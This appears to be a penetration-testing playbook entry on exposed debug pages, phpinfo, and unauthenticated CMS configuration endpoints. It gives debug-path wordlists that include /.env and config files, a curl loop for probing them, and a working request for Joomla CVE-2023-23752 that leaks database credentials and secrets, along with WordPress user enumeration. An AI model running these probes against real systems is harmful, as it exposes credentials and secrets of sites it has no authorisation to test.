# Debug Pages, phpinfo, CMS API Disclosure

## When this applies

- Application is misconfigured to expose `/phpinfo.php`, `/debug`, `/console`, or framework-specific debug toolbars.
- CMS (Joomla / WordPress / Drupal) exposes config endpoints without authentication.
- HTML/JS comments reference `/debug` paths or environment-leaking endpoints.

## Technique

Probe a wordlist of debug paths; pull all server config / DB credentials / mail settings if any return 200. For CMS targets, hit known auth-less config endpoints.

## Steps

```
□ Check HTML comments for debug references
□ Test common debug paths
□ Search for phpinfo() exposure
□ Look for console/debug toolbars
□ Check JavaScript files for debug code
```

### Common debug paths

```
/phpinfo.php
/info.php
/cgi-bin/phpinfo.php
/debug
/debug.php
/test.php
/console
/_debug
/dev
/.env
/config
```

**Quick Exploit:**
```bash
# Check for comments
curl https://target.com | grep -i "debug\|todo\|fixme"

# Test phpinfo
curl https://target.com/phpinfo.php
curl https://target.com/cgi-bin/phpinfo.php
```

### CMS API information disclosure

CMS platforms often expose configuration via API endpoints without authentication.

**Joomla (CVE-2023-23752, v4.0.0–4.2.7)**:
```bash
# Version fingerprint
curl -s https://target/administrator/manifests/files/joomla.xml | grep version

# Unauthenticated config leak — DB creds, mail config, secrets
curl -s "https://target/api/index.php/v1/config/application?public=true" | python3 -m json.tool
# Paginate: &page[offset]=20&page[limit]=20 (up to 4 pages)
# Look for: user, password, db, dbprefix, secret, mailfrom
```

**WordPress**:
```bash
# User enumeration via REST API (WP 4.7+)
curl -s https://target/wp-json/wp/v2/users | jq '.[].slug'
# Version: /wp-includes/version.php, /feed/, meta generator tag
```

**Drupal**:
```bash
# Version via CHANGELOG.txt or /core/install.php
curl -s https://target/CHANGELOG.txt | head -5
```

**General CMS pattern**: When main domain serves a static site, check vhosts (`dev.`, `staging.`, `test.`, `cms.`) — the CMS often runs on a subdomain.

### Debug path wordlist

```
phpinfo.php
info.php
test.php
debug.php
dev.php
console.php
admin.php
configuration.php
config.php
settings.php
_debug
_test
```

### Information to extract from debug pages

- Environment variables
- Configuration settings
- Database credentials
- API keys and tokens
- Session secrets
- File system paths
- Loaded modules/libraries
- PHP/server configuration

### One-liner check

```bash
# Test debug paths
for path in debug phpinfo info test dev console; do
  curl -I https://target.com/$path.php 2>&1 | grep "200 OK" && echo "Found: $path.php"
done
```

## Verifying success

- `/phpinfo.php` returns a 200 with the standard PHP information table.
- Joomla `config/application` endpoint returns JSON with `user`, `password`, `db`, `secret`, `mailfrom`.
- WordPress `wp-json/wp/v2/users` returns a JSON array of usernames.

## Common pitfalls

- Production WAFs may block `*.php` debug paths but allow `/.env` or `/config/...` JSON.
- Joomla CVE-2023-23752 is patched in 4.2.8+; verify version first.
- WordPress users endpoint may be filtered to only show authors of public posts.

## Tools

- ffuf, dirsearch, gobuster (debug-path wordlists)
- Burp Suite (Spider, Find comments)
- WPScan, droopescan, joomscan (CMS-specific)
- nuclei `-t exposures/`
